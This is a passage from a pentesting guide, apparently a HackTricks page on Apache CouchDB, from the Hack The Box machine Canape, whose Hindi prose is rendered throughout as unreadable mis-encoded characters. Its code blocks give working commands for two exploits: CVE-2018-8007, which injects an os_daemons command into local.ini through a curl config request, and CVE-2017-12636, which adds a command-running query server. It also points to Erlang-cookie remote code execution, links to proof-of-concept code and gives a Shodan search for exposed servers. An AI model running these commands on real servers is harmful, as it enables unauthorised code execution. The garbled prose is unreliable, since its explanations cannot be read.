рдкреЛрд░реНрдЯ `4369` рдХреЗ рд╕рдВрдмрдВрдз рдореЗрдВ рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕реБрд░рдХреНрд╖рд╛ рд╕рд▓рд╛рд╣ рджреА рдЧрдИ рд╣реИред рдпрджрд┐ рдпрд╣ рдкреЛрд░реНрдЯ рдЗрдВрдЯрд░рдиреЗрдЯ рдпрд╛ рдХрд┐рд╕реА рднреА рдЕрд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рдкрд╣реБрдВрдЪрдиреЗ рдпреЛрдЧреНрдп рд╣реИ, рддреЛ рд╕рд┐рд╕реНрдЯрдо рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдПрдХ рдЕрджреНрд╡рд┐рддреАрдп рдкрд╣рдЪрд╛рдирдХрд░реНрддрд╛ рдЬрд┐рд╕реЗ "рдХреБрдХреА" рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ рдкрд░ рднрд╛рд░рд┐рдд рд╣реЛрддреА рд╣реИред рдпрд╣ рдХреБрдХреА рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рд░рдХреНрд╖рд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рдо рдХрд░рддреА рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдПрдХ рджрд┐рдпрд╛ рдЧрдпрд╛ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕реВрдЪреА рдореЗрдВ, "рдореЙрдиреНрд╕реНрдЯрд░" рдирд╛рдордХ рдХреБрдХреА рджреЗрдЦреА рдЬрд╛ рд╕рдХрддреА рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╕рд┐рд╕реНрдЯрдо рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдврд╛рдВрдЪреЗ рдореЗрдВ рдЗрд╕рдХреА рдкрд░рд┐рдЪрд╛рд▓рди рднреВрдорд┐рдХрд╛ рдХрд╛ рдкрддрд╛ рдЪрд▓рддрд╛ рд╣реИред
```
www-data@canape:/$ ps aux | grep couchdb
root        744  0.0  0.0   4240   640 ?        Ss   Sep13   0:00 runsv couchdb
root        811  0.0  0.0   4384   800 ?        S    Sep13   0:00 svlogd -tt /var/log/couchdb
homer       815  0.4  3.4 649348 34524 ?        Sl   Sep13   5:33 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/b
```
рдЙрди рд▓реЛрдЧреЛрдВ рдХреЗ рд▓рд┐рдП рдЬреЛ рдЗрд╕ "рдХреБрдХреА" рдХреЛ рджреВрд░рд╕реНрде рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди (RCE) рдХреЗ рд▓рд┐рдП рдХреИрд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдПрд░рд▓реИрдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ, рдПрдХ рд╡рд┐рд╢реЗрд╖ рдЦрдВрдб рдЙрдкрд▓рдмреНрдз рд╣реИ рдФрд░ рдЖрдЧреЗ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдПред рдпрд╣ рд╡рд┐рд╡рд░рдг рдЙрди рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЛ рд╡рд┐рд╕реНрддрд╛рд░ рд╕реЗ рд╡рд░реНрдгрд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬрд┐рдирдХрд╛ рдЙрдкрдпреЛрдЧ рдЕрдирдзрд┐рдХреГрдд рддрд░реАрдХреЛрдВ рд╕реЗ рдПрд░рд▓реИрдВрдЧ рдХреБрдХреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЖрдк **[рдпрд╣рд╛рдБ рдПрд░рд▓реИрдВрдЧ рдХреБрдХреА рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рд╕реНрддреГрдд рдорд╛рд░реНрдЧрджрд░реНрд╢рд┐рдХрд╛ рдХрд╛ рдЕрдиреНрд╡реЗрд╖рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ](4369-pentesting-erlang-port-mapper-daemon-epmd.md#erlang-cookie-rce)**ред

### **рд▓реЛрдХрд▓.ini рдХрд╛ рд╕рдВрд╢реЛрдзрди рдХрд░рдХреЗ CVE-2018-8007 рдХрд╛ рд╢реЛрдзрди**

рдЙрджрд╛рд╣рд░рдг [рдпрд╣рд╛рдБ рд╕реЗ](https://0xdf.gitlab.io/2018/09/15/htb-canape.html)ред

рд╣рд╛рд▓ рд╣реА рдореЗрдВ рдЦреБрд▓рд╛рд╕рд╛ рд╣реБрдЖ рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖, CVE-2018-8007, рдЬреЛ рдПрдкрд╛рдЪреА рдХрд╛рдЙрдЪрдбреАрдмреА рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЙрд╕реЗ рдЬрд╛рдВрдЪрд╛ рдЧрдпрд╛, рдЬрд┐рд╕рд╕реЗ рдкрддрд╛ рдЪрд▓рд╛ рдХрд┐ рдЙрддреНрдкреАрдбрд╝рди рдХреЗ рд▓рд┐рдП `local.ini` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд▓реЗрдЦрди рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдЖрд╡рд╢реНрдпрдХ рд╣реИрдВред рдпрджреНрдпрдкрд┐ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рд▓рдХреНрд╖реНрдп рд╕рд┐рд╕реНрдЯрдо рдкрд░ рд╕реАрдзреЗ рд▓рд╛рдЧреВ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рддрд┐рдмрдВрдзреЛрдВ рдХреЗ рдХрд╛рд░рдг, рдЕрдиреНрд╡реЗрд╖рдг рдХреЗ рдЙрджреНрджреЗрд╢реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП `local.ini` рдлрд╝рд╛рдЗрд▓ рдХреЛ рд▓реЗрдЦрди рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрд╢реЛрдзрди рдХрд┐рдП рдЧрдПред рд╡рд┐рд╕реНрддреГрдд рдЪрд░рдг рдФрд░ рдХреЛрдб рдЙрджрд╛рд╣рд░рдг рдиреАрдЪреЗ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП рд╣реИрдВ, рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рддреЗ рд╣реБрдПред

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рдкрд░реНрдпрд╛рд╡рд░рдг рдХреЛ рддреИрдпрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ `local.ini` рдлрд╝рд╛рдЗрд▓ рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рд╣реИ, рдЬрд┐рдЬреНрдЮрд╛рд╕рд╛ рдХрд░рдХреЗ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```bash
root@canape:/home/homer/etc# ls -l
-r--r--r-- 1 homer homer 18477 Jan 20  2018 default.ini
-rw-rw-rw- 1 homer homer  4841 Sep 14 17:39 local.ini
-r--r--r-- 1 root  root   4841 Sep 14 14:30 local.ini.bk
-r--r--r-- 1 homer homer  1345 Jan 14  2018 vm.args
```
рдХрдордЬреЛрд░реА рдХрд╛ рд╢реЛрдзрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдПрдХ curl рдХрдорд╛рдВрдб рдХреЛ рдирд┐рд╖реЗрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, `local.ini` рдореЗрдВ `cors/origins` рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рд▓рдХреНрд╖рд┐рдд рдХрд░рддреЗ рд╣реБрдПред рдЗрд╕рдореЗрдВ рдПрдХ рдирдпрд╛ рдореВрд▓ рд╕рдореНрдорд┐рд▓рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рд╕рд╛рде рд╣реА `[os_daemons]` рдЦрдВрдб рдХреЗ рддрд╣рдд рдЕрддрд┐рд░рд┐рдХреНрдд рдХрдорд╛рдВрдб, рдЕрд░реНрдмрд┐рдЯреНрд░реЗ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рд╣реИ:
```bash
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/cors/origins' -H "Accept: application/json" -H "Content-Type: application/json" -d "0xdf\n\n[os_daemons]\ntestdaemon = /usr/bin/touch /tmp/0xdf"
```
рдЖрдЧреЗ рдХреА рдкреБрд╖реНрдЯрд┐ `local.ini` рдореЗрдВ рдбрд╛рд▓реА рдЧрдИ рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рджрд┐рдЦрд╛рддреА рд╣реИ, рдЬрд┐рд╕реЗ рдПрдХ рдмреИрдХрдЕрдк рдХреЗ рд╕рд╛рде рддреБрд▓рдирд╛ рдХрд░рдХреЗ рдкрд░рд┐рд╡рд░реНрддрдиреЛрдВ рдкрд░ рдзреНрдпрд╛рди рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```bash
root@canape:/home/homer/etc# diff local.ini local.ini.bk
119,124d118
< [cors]
< origins = 0xdf
< [os_daemons]
< test_daemon = /usr/bin/touch /tmp/0xdf
```
рдЖрд░рдВрдн рдореЗрдВ, рдЕрдкреЗрдХреНрд╖рд┐рдд рдлрд╝рд╛рдЗрд▓ (`/tmp/0xdf`) рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╕реНрдкрд╖реНрдЯ рд╣реЛрддрд╛ рд╣реИ рдХрд┐ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдХрдорд╛рдВрдб рдЕрднреА рддрдХ рдирд╣реАрдВ рдЪрд▓рд╛рдпрд╛ рдЧрдпрд╛ рд╣реИред рдФрд░ рдЬрд╛рдВрдЪ рдореЗрдВ рдкрддрд╛ рдЪрд▓рддрд╛ рд╣реИ рдХрд┐ CouchDB рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдБ рдЪрд▓ рд░рд╣реА рд╣реИрдВ, рдЬрд┐рд╕рдореЗрдВ рд╕реЗ рдПрдХ рдРрд╕реА рд╣реИ рдЬреЛ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд┐рдП рдЧрдП рдХрдорд╛рдВрдб рдХреЛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд░ рд╕рдХрддреА рд╣реИ:
```bash
root@canape:/home/homer/bin# ps aux | grep couch
```
рдХреЛрдЪрдбреАрдмреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдкрд╣рдЪрд╛рдирдиреЗ рдХреЗ рдмрд╛рдж рд╕рдорд╛рдкреНрдд рдХрд░рдХреЗ рд╕рд┐рд╕реНрдЯрдо рдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдкреБрдирдГ рдЖрд░рдВрдн рдХрд░рдиреЗ рджреНрд╡рд╛рд░рд╛, рдЙрднрд░реЗ рд╣реБрдП рдХрдорд╛рдВрдб рдХрд╛ рдирд┐рд╖реНрдкрд╛рджрди рдкреНрд░реЗрд░рд┐рдд рд╣реЛрддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ рдкрд╣рд▓реЗ рдЧрд╛рдпрдм рдлрд╝рд╛рдЗрд▓ рдХреА рдореМрдЬреВрджрдЧреА рджреНрд╡рд╛рд░рд╛ рдкреБрд╖реНрдЯрд┐ рдХреА рдЬрд╛рддреА рд╣реИ:
```bash
root@canape:/home/homer/etc# kill 711
root@canape:/home/homer/etc# ls /tmp/0xdf
/tmp/0xdf
```
рдпрд╣ рдЕрдиреНрд╡реЗрд╖рдг рд╡рд┐рд╢реЗрд╖ рдкрд░рд┐рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдХреЗ рддрд╣рдд CVE-2018-8007 рд╢реЛрд╖рдг рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рддрд╛ рд╣реИ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ `local.ini` рдлрд╝рд╛рдЗрд▓ рдХреЗ рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рдПрдХреНрд╕реЗрд╕ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЛ рдзреНрдпрд╛рди рдореЗрдВ рд░рдЦрддреЗ рд╣реБрдПред рдкреНрд░рджрддреНрдд рдХреЛрдб рдЙрджрд╛рд╣рд░рдг рдФрд░ рдкреНрд░рдХреНрд░рд┐рдпрд╛рддреНрдордХ рдЪрд░рдг рдПрдХ рдирд┐рдпрдВрддреНрд░рд┐рдд рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рд╢реЛрд╖рдг рдХреА рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рдХреЗ рд▓рд┐рдП рдПрдХ рд╕реНрдкрд╖реНрдЯ рдорд╛рд░реНрдЧрджрд░реНрд╢рд┐рдХрд╛ рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВред

рдЕрдзрд┐рдХ рд╡рд┐рд╡рд░рдг рдХреЗ рд▓рд┐рдП CVE-2018-8007 рдкрд░, mdsec рджреНрд╡рд╛рд░рд╛ рд╕реВрдЪрдирд╛ рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ: [CVE-2018-8007](https://www.mdsec.co.uk/2018/08/advisory-cve-2018-8007-apache-couchdb-remote-code-execution/).

### **рд▓реЛрдХрд▓.ini рдкрд░ рд▓реЗрдЦрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде CVE-2017-12636 рдХрд╛ рдЕрдиреНрд╡реЗрд╖рдг**

рдЙрджрд╛рд╣рд░рдг [рдпрд╣рд╛рдБ рд╕реЗ](https://0xdf.gitlab.io/2018/09/15/htb-canape.html)ред

рдПрдХ рднреЗрджреНрдпрддрд╛ рдЬрд┐рд╕реЗ CVE-2017-12636 рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЙрд╕реЗ рдЕрдиреНрд╡реЗрд╖рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рдЬреЛ рдХрд╛рдЙрдЪрдбреАрдмреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рдХреЛ рд╕рдВрднрд╡ рдмрдирд╛рддрд╛ рд╣реИ, рд╣рд╛рд▓рд╛рдВрдХрд┐ рд╡рд┐рд╢реЗрд╖ рд╡рд┐рдиреНрдпрд╛рд╕реЛрдВ рд╕реЗ рдЗрд╕рдХрд╛ рд╢реЛрд╖рдг рд░реЛрдХ рд╕рдХрддрд╛ рд╣реИред рдСрдирд▓рд╛рдЗрди рдЙрдкрд▓рдмреНрдз рдХрдИ рдкреНрд░рдорд╛рдг рдХрд╛ (POC) рд╕рдВрджрд░реНрдн рд╣реЛрдиреЗ рдХреЗ рдмрд╛рд╡рдЬреВрдж, рдХрд╛рдЙрдЪрдбреАрдмреА рд╕рдВрд╕реНрдХрд░рдг 2 рдкрд░ рднреЗрджреНрдпрддрд╛ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрд╢реЛрдзрди рдЖрд╡рд╢реНрдпрдХ рд╣реИ, рдЬреЛ рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рд▓рдХреНрд╖рд┐рдд рд╕рдВрд╕реНрдХрд░рдг 1.x рд╕реЗ рднрд┐рдиреНрди рд╣реИред рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдХрджрдо рдХрд╛рдЙрдЪрдбреАрдмреА рд╕рдВрд╕реНрдХрд░рдг рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ рдФрд░ рдЕрдкреЗрдХреНрд╖рд┐рдд рдХреНрд╡реЗрд░реА рд╕рд░реНрд╡рд░ рдкрде рдХреА рдЕрдиреБрдкрд╕реНрдерд┐рддрд┐ рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ рдореЗрдВ рд╕рдореНрдорд┐рд▓рд┐рдд рд╣реИрдВ:
```bash
curl http://localhost:5984
curl http://0xdf:df@localhost:5984/_config/query_servers/
```
CouchDB рд╕рдВрд╕реНрдХрд░рдг 2.0 рдХреЛ рд╕рдорд╛рдпреЛрдЬрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдирдпрд╛ рдкрде рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```bash
curl 'http://0xdf:df@localhost:5984/_membership'
curl http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers
```
рдХреЛрд╢рд┐рд╢реЗрдВ рдирдП рдХреНрд╡реЗрд░реА рд╕рд░реНрд╡рд░ рдЬреЛрдбрд╝рдиреЗ рдФрд░ рдЖрдордВрддреНрд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреБрдорддрд┐ рд╕рдВрдмрдВрдзрд┐рдд рддреНрд░реБрдЯрд┐рдпреЛрдВ рд╕реЗ рднреЗрдВрдЯ рдХрд░рд╛рдИ рдЧрдИрдВ, рдЬреИрд╕рд╛ рдХрд┐ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЖрдЙрдЯрдкреБрдЯ рджреНрд╡рд╛рд░рд╛ рд╕реВрдЪрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```bash
curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
```
рдФрд░ рдЬрд╛рдВрдЪ рдореЗрдВ рдкрддрд╛ рдЪрд▓рд╛ рдХрд┐ `local.ini` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдЕрдиреБрдорддрд┐ рд╕рдорд╕реНрдпрд╛рдПрдБ рдереАрдВ, рдЬрд┐рд╕реЗ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рдереАред рд░реВрдЯ рдпрд╛ рд╣реЛрдорд░ рдПрдХреНрд╕реЗрд╕ рдХреЗ рд╕рд╛рде рдлрд╝рд╛рдЗрд▓ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ, рдЖрдЧреЗ рдмрдврд╝рдирд╛ рд╕рдВрднрд╡ рд╣реБрдЖ:
```bash
cp /home/homer/etc/local.ini /home/homer/etc/local.ini.b
chmod 666 /home/homer/etc/local.ini
```
рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдкрд░ рдкрд╛рдпрд╛ рдЧрдпрд╛ рдХрд┐ рдХреНрд╡реЗрд░реА рд╕рд░реНрд╡рд░ рдЬреЛрдбрд╝рдиреЗ рдХреА рдкреНрд░рдпрд╛рд╕реЛрдВ рдореЗрдВ рдЙрддреНрддрд░ рдореЗрдВ рдХреЛрдИ рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдирд╣реАрдВ рдерд╛, рдЬрд┐рд╕рд╕реЗ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ `local.ini` рдлрд╝рд╛рдЗрд▓ рдХрд╛ рд╕рдВрд╢реЛрдзрди рд╣реБрдЖ рдерд╛:
```bash
curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
```
рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЬрд╛рд░реА рд░рд╣реА рдбреЗрдЯрд╛рдмреЗрд╕ рдФрд░ рдПрдХ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХрд╛ рдирд┐рд░реНрдорд╛рдг рдХрд░рдиреЗ рдХреЗ рд╕рд╛рде, рдЬрд┐рд╕рдХреЗ рдмрд╛рдж рдирдП рдЬреЛрдбрд╝реЗ рдЧрдП рдХреНрд╡реЗрд░реА рд╕рд░реНрд╡рд░ рдХреЛ рдореИрдк рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдХрд╕реНрдЯрдо рд╡реНрдпреВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд┐рдпрд╛ рдЧрдпрд╛:
```bash
curl -X PUT 'http://0xdf:df@localhost:5984/df'
curl -X PUT 'http://0xdf:df@localhost:5984/df/zero' -d '{"_id": "HTP"}'
curl -X PUT 'http://0xdf:df@localhost:5984/df/_design/zero' -d '{"_id": "_design/zero", "views": {"anything": {"map": ""} }, "language": "cmd"}'
```
**[рдПрдХ рд╕рд╛рд░рд╛рдВрд╢](https://github.com/carlospolop/hacktricks/pull/116/commits/e505cc2b557610ef5cce09df6a14b10caf8f75a0)** рдПрдХ рд╡реИрдХрд▓реНрдкрд┐рдХ payload рдХреЗ рд╕рд╛рде CVE-2017-12636 рдХрд╛ рд╢реЛрдз рдХрд░рдиреЗ рдХреЗ рдФрд░ рдЕрдзрд┐рдХ рдЕрдВрджрд░ рджреЗрддрд╛ рд╣реИ рд╡рд┐рд╢реЗрд╖ рдкрд░рд┐рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдХреЗ рддрд╣рдд рдЗрд╕рдХрд╛ рд╢реЛрдз рдХрд░рдиреЗ рдХреЗ рдЙрдкрдпреЛрдЧреА рд╕рдВрд╕рд╛рдзрди рд╢рд╛рдорд┐рд▓ рд╣реИрдВ:

- [POC exploit code](https://raw.githubusercontent.com/vulhub/vulhub/master/couchdb/CVE-2017-12636/exp.py)
- [Exploit Database entry](https://www.exploit-db.com/exploits/44913/)

## Shodan

* `port:5984 couchdb`

## рд╕рдВрджрд░реНрдн

* [https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html](https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html)
* [https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution](https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution)

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рдЬреБрдбрд╝реЗрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks_live)** рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдХреЛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>
